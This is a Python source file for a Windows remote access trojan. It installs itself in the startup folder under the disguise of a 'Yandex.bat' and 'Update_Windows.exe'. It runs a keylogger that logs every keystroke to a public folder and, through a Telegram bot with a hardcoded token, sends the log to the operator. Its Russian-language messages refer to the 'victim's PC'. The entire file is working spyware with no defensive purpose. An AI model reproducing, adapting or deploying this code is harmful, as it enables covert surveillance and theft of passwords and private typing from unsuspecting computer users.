import telebot
from telebot import types

from pynput import keyboard
import datetime
import time

import win32api
import win32gui

import getpass
import os

import pyautogui
import subprocess
import win32con



username = os.getlogin()
file_derect2 = r'start "Update_Windows" "C:\Users\Public\Update_Windows.exe" /param1 /param2'
file_derect = r'C:\Users\Public\Ubdate_Windows.exe'
print(file_derect)
USER_NAME = getpass.getuser()
def add_to_startup(file_path=""):
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "Yandex.bat", "w+") as bat_file: bat_file.write(file_derect2)

    #global bat_path
    #print('del ' + '"' + bat_path + '\\' + "Yandex.bat" + '"')

add_to_startup()


def setEngLayout():
    window_handle = win32gui.GetForegroundWindow()
    result = win32api.SendMessage(window_handle, 0x0050, 0, 0x04090409)
    return (result)

def Keylogs():
    class KeyLog():


        def __init__(self, filename: str = "C:\\Users\\Public\\logs.txt") -> None:
            self.filename = filename
            text = '''Keylog v1
<96> - 0
<97> - 1
<98>  - 2
<99>  - 3
<100>  - 4
<101>  - 5
<102>  - 6
<103>  - 7 
<104>  - 8
<105>  - 9'''
            self.filename = r"C:\Users\Public\logs.txt"
            with open(self.filename, 'a') as logs:
                logs.write(text + "\n")
        @staticmethod
        def get_char(key):
            try:
                return key.char
            except AttributeError:
                return str(key)

        def on_press(self, key):
            print(str(key))
            with open(self.filename, 'a') as logs:
                dt_now = datetime.datetime.now()
                logs.write(str(dt_now) + str(":   ") + self.get_char(str(key)) + "\n")

        def main(self):
            listener = keyboard.Listener(on_press=self.on_press,)
            listener.start()


    if __name__ == '__main__':
        logger = KeyLog()
        logger.main()
        # input()


bot = telebot.TeleBot('6619437777:AAGAmak2lcgXlaJc1KniqJrpT2sjlSwXpIg')


@bot.message_handler(commands=['start_rat'])
def start_rat(message):
    USER_NAME = getpass.getuser()
    bot.send_message(message.chat.id, f"RAT робiть на пк жертвы {USER_NAME}")



@bot.message_handler(commands=['keylog'])
def website(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    start = types.KeyboardButton("start keylog")
    stop = types.KeyboardButton("stop keylog")
    markup.add(start,stop)
    bot.send_message(message.chat.id, 'Запуститье кейлогер', reply_markup=markup)


@bot.message_handler(commands=['exit'])
def exut(message):
    try:
        bot.send_message(message.chat.id, "Удаление кейлогера и bat с автозагрузкой")
        #os.system(r'del C:\Users\Public\Ubdate_Windows.exe')
        USER_NAME = getpass.getuser()
        os.system(f'del "C:\\Users\\{USER_NAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Yandex.bat"')
        os.system(r"del C:\Users\Public\logs.txt")
        bot.send_message(message.chat.id, "Всё ОК")
    except:
        bot.send_message(message.chat.id, "Неудалось удалить файлы")


@bot.message_handler(commands=['help'])
def help(message):
    USER_NAME = getpass.getuser()
    text = f'''Всё работает ПК жертвы {USER_NAME}
Запуск кейлогера - /keylog
Закрыть кейлогер - /exit'''
    bot.send_message(message.chat.id, text)
    bot.send_message(message.chat.id, "Создание папки где будет лежить keyloger")
    try:
        os.mkdir("C:\\Users\\Public\\")
        bot.send_message(message.chat.id, "Папка создана C:\\Users\\Public\\ там будет лежать keyloger")
    except:
        bot.send_message(message.chat.id, "Либо такая папка уже есть либо какая та ошибка")


@bot.message_handler(content_types=['text'])
def get_user_text(message):
    bot.send_message(message.chat.id, 'Запуститье кейлогер')

    #работа кейлогера

    if message.text == "stop keylog":
        try:
            logo = open("C:\\Users\\Public\\logs.txt", "rb")
            bot.send_document(message.chat.id, logo)
        except:
            bot.send_message(message.chat.id, "Какая та ошибка")

    elif message.text == 'start keylog':
        setEngLayout()
        bot.send_message(message.chat.id, "Кейлогер Запущен")
        Keylogs()
        time.sleep(1)
        pyautogui.write('t')
        # except:
        #     bot.send_message(message.chat.id, "Какая та ошибка")
        # # time.sleep(3)
        # # keyboard.write("Test")


bot.polling(none_stop=True)